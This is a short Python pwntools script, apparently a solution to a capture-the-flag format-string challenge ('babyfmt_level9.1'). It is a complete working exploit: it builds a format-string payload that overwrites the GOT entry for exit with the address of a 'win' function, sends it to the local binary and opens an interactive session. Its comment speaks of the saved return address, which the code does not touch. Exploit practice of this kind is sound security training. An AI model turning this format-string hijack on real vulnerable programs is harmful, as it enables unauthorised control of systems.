from pwn import *
BINARY = "/challenge/babyfmt_level9.1"

context.arch = 'amd64'



elf = ELF(BINARY)

p = process(BINARY)

# write win addr to saved rip

payload = b"A" * 1 + fmtstr_payload(55, {elf.got['exit']: elf.sym['win']}, numbwritten = 40)
print(payload)
p.send(payload)
p.interactive()